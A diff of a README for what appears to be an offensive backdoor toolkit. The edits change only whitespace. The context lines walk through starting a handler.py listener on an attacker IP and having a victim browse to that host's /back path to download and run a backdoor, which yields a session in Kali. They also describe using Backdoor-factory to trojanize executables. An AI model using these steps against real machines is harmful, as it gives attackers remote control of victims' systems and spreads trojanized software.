@@ -19,10 +19,11 @@ Run in Kali:
 + python ./handler.py 192.168.0.100
 
 In the victim machine:
-
 Use a browser and navigate to 192.168.0.100/back and you will see the backdoors created before in the attacker machine.
 Download the backdoor that you want to use.
+
 Run the backdoor.
+
 
 You will have a session of the victim's machine in Kali.
 
@@ -53,6 +54,7 @@ python ./handler.py <IP_attacker>
 
 ## Backdoor-factory
 The backdoor-factory introduce the backdoor inside executables.
+
 If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
 
 https://github.com/secretsquirrel/the-backdoor-factory.git
